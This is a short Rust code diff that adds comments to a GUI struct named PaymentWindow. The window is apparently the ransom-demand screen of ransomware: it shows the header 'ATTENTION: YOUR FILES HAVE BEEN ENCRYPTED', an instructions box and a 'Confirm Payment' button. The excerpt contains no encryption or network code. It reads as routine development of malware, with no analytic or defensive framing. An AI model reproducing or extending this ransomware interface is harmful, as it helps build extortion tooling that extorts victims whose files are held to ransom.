@@ -10,12 +10,15 @@ pub struct PaymentWindow {
     #[nwg_events(OnWindowClose: [PaymentWindow::close])]
     window: nwg::Window,
 
+    // Title
     #[nwg_control(text: "ATTENTION: YOUR FILES HAVE BEEN ENCRYPTED", position: (20, 10), size: (600, 90), flags: "VISIBLE")]
     header: nwg::Label,
 
+    // Main textbox
     #[nwg_control(text: "", position: (20, 70), size: (600, 350), flags: "VISIBLE|VSCROLL|AUTOVSCROLL", readonly: true)]
     instructions: nwg::TextBox,
 
+    // Button to open payment confirmation window
     #[nwg_control(text: "Confirm Payment", position: (450, 460), size: (150, 30), flags: "VISIBLE")]
     #[nwg_events(OnButtonClick: [PaymentWindow::on_confirm_payment])]
     confirm_btn: nwg::Button,
